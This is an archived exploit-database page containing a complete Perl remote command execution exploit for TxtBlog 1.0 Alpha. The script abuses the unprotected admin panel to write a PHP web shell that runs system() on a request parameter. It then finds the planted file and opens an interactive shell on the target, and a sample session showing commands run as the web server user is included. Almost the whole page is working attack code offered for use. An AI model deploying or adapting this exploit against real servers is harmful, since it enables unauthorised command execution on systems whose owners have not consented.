<html><head><title>TxtBlog 1.0 Alpha Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# -----------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------

# App   =&gt; TxtBlog v 1.0 Alpha
# Downl =&gt; http://downloads.sourceforge.net/txtblogcms/txtblogcms-1.0a.zip

# Remote Command Execution Exploit
# by Osirys
# osirys[at]autistici[dot]org
# osirys.org

# I wrote this simple RCE exploit, just becouse by default the blog
# administration password is disabled. So, from admin panel, we can
# create .php files.

# Tested with: Magic Quotes =&gt; Off

# ------------------------------------------------------------------
# Exploit in action [&gt;!]
# ------------------------------------------------------------------
# osirys[~]&gt;$ perl rce_bleah.txt http://localhost/txtblogcms-1.0a/

#   ---------------------------
#      TxtBlog RCE Exploit
#            by Osirys
#   ---------------------------

# [+] Creating RCE file ..
# [+] RCE Created !
# [+] File found !
# [+] Hi my master, do your job now [!]

# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; whoami
# apache
# shell[localhost]$&gt; exit
# [-] Quitting ..
# osirys[~]&gt;
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $adm_path  =  &quot;/admin/index.php&quot;;
my $rce_crea  =  $adm_path.&quot;?page=create&quot;;
my $host      =  $ARGV[0];


($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $url = $host.$adm_path;
my $test = get_req($url);

if ($re !~ /Welcome to the administration/) {
    my $url = $path.$rce_crea;
    my $code = &quot;title=new+page&amp;blog=%27%3B+%20echo+%22Osirys%3Cbr%3E%22;+system%28%24_GET%5Bcmd%5D%29%3B+%24a+%3D+%27&amp;location=&amp;Submit=Save&quot;;
    my $length = length($code);
    my $data = &quot;POST &quot;.$url.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $code.&quot;\r\n&quot;;

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr =&gt; $h0st,
                                          PeerPort =&gt; '80',
                                          Proto    =&gt; 'tcp',
                                        ) or die &quot;[-] Can't connect to $h0st:80\n[?] $! \n\n&quot;;

    print &quot;[+] Creating RCE file ..\n&quot;;
    $socket-&gt;send($data);

    while ((my $e = &lt;$socket&gt;)&amp;&amp;($own != 1)) {
        if ($e =~ /Your new blog has been saved/) {
            $own = 1;
            print &quot;[+] RCE Created ! \n&quot;;
        }
    }
    $own == 1 || die &quot;[-] Can't write new file\n&quot;;

    $mfile = &amp;find_file;
    print &quot;[+] Hi my master, do your job now [!]\n\n&quot;;
    &amp;exec_cmd;

}
else {
    print &quot;[-] Administration requires password !\n&quot;;
    exit(0);
}

sub find_file {
    my $year = (localtime)[5] + 1900;
    my $month = (localtime)[4];
    my $day   = (localtime)[3];
    if ($month =~ /[0-9]{1}/) { $month =~ s/([0-9]{1})/0$1/; }
    if ($day =~ /[0-9]{1}/) { $day =~ s/([0-9]{1})/0$1/; }
    for ($i = 0;$i &lt;= 15; $i++) {
        my $url = $host.&quot;/data/&quot;.$year.&quot;/&quot;.$month.&quot;/&quot;.$day.&quot;-&quot;.$i.&quot;.php&quot;;
        my $re = get_req($url);
        if ($re =~ /Osirys&lt;br&gt;/) {
            $g0t = 1;
            print &quot;[+] File found !\n&quot;;
            $file_path = $url;
            return($file_path);
        }
    }
    if ($g0t != 1) {
        print &quot;[-] Can't find evil file !\n&quot;;
        exit(0);
    }
}

sub exec_cmd {
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n&quot;;
    $exec_url = $mfile.&quot;?cmd=&quot;.$cmd;
    $re = get_req($exec_url);
    if ($re =~ /Osirys&lt;br&gt;(.)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            $o =~ s/Osirys&lt;br&gt;//;
            print &quot;$o&quot;;
        }
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------- \n&quot;.
          &quot;     TxtBlog RCE Exploit      \n&quot;.
          &quot;           by Osirys          \n&quot;.
          &quot;  --------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad hostname! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-03]</pre></html>